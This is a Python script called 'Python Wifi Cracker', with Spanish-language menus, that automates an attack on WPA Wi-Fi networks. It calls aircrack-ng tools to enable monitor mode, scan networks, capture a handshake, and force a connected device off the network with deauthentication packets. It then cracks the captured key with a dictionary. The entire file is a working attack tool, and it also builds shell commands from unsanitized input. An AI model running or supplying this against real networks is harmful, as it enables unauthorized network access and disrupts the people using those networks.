import os

print ('''
\033[1;32m************************Python Wifi Cracker************************\033[1;m
\033[1;32m Author: Marco Argueta\033[1;m
		''')

print("Selecciona la opcion que deseas realizar")

try:
	def inicio():


		while True:
			print('''
1) Ver tarjetas de red.
2) Escanear redes inalambricas.
3) Seleccionar red a crackear.
4) Capturar handshake.
5) Utilizar diccionario.
6) Relavantar servicios
*) Ctrl + c para salir.
			''')
			
			opcion = input("\033[1;32mSeleccione opcion: \033[1;m")

			while opcion == "1":
				print("Tarjetas disponibles")
				os.system("ifconfig")
				deseeaseguir = input("\033[1;32mDesea poner en modo monitor su tarjea (si/no): \033[1;m")
				if deseeaseguir == "si":
					tarjeta = input("\033[1;32mEscriba el nombre de la tarjeta de red a poner en modo monitor: \033[1;m")
					#Aqui debe ir el comando de aircrack check kill y modo monitor
					os.system("airmon-ng check kill")
					os.system("airmon-ng start " + tarjeta)
					print("Modo monitor activado")
					opcion = input("\033[1;32mPresione 2 para comenzar a escanear redes WiFi: \033[1;m")
				else:
					inicio()

			while opcion == "2":
				os.system("airodump-ng " + tarjeta + "mon")
				opcion = input("\033[1;32mEscriba 3 para continuar: \033[1;m")

			while opcion == "3":
				canal = input("\033[1;32mEscriba el numero de canal: \033[1;m")
				capture = input("\033[1;32mEscriba la ubicacion donde se guardara el capture: \033[1;m")
				ssid = input("\033[1;32mEscriba la mac del router: \033[1;m")
				os.system("airodump-ng -c " + canal + "	-w " + capture + "capture --bssid " + ssid + " " + tarjeta + "mon")
				opcion = input("\033[1;32mEscriba 6 para continuar: \033[1;m")

			while opcion == "4":
				ssid = input("\033[1;32mEscriba la mac del router: \033[1;m")
				conectado = input("\033[1;32mEscriba la mac del dispotivo conectado: \033[1;m")
				tarjeta = input("\033[1;32mEscriba el nombre de la tarjeta WiFi: \033[1;m")
				os.system("aireplay-ng -0 5 -a " + ssid + " -c " + conectado + " " + tarjeta)
				
				opcion4 = input("\033[1;32mEscriba si para ir al menu principal: \033[1;m")
				if opcion4 == "si":
					inicio()

			while opcion == "5":
				diccionario = input("\033[1;32mEscriba la ubicacion del diccionario: \033[1;m")
				capture = input("\033[1;32mEscriba la ubicacion del capture-01.cap: \033[1;m")
				os.system("aircrack-ng -w " + diccionario + " " + capture)
				
				opcion5 = input("\033[1;32mEscriba si para ir al menu principal: \033[1;m")
				if opcion5 == "si":
					inicio()

			while opcion == "6":
				print("\033[1;91mLevantando servicios\033[1;m")
				os.system("airmon-ng stop " + tarjeta + "mon")
				print("\033[1;91mWiFi levantado\033[1;m")
				os.system("service network-manager start")
				print("\033[1;91mServicio de red levantado\033[1;m")
				opcion6 = input("\033[1;32mEscriba si para ir al menu principal: \033[1;m")
				if opcion6 == "si":
					inicio()
	inicio()

except KeyboardInterrupt:
	print("Adios")
